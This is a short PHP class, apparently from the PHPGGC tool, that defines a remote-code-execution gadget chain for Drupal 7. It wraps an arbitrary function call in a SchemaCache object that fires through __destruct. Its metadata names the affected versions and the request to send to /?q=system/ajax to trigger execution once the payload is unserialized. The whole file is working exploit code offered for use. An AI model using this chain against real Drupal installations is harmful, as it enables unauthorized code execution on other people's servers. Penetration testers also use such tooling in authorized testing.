<?php

namespace GadgetChain\Drupal7;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '7.0.8 < ?';
    public static $vector = '__destruct';
    public static $author = 'Blaklis';
    public static $information = 'You will need to post form_build_id=DrupalRCE to /?q=system/ajax once the payload is unserialized';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \SchemaCache($function,$parameter);
    }
}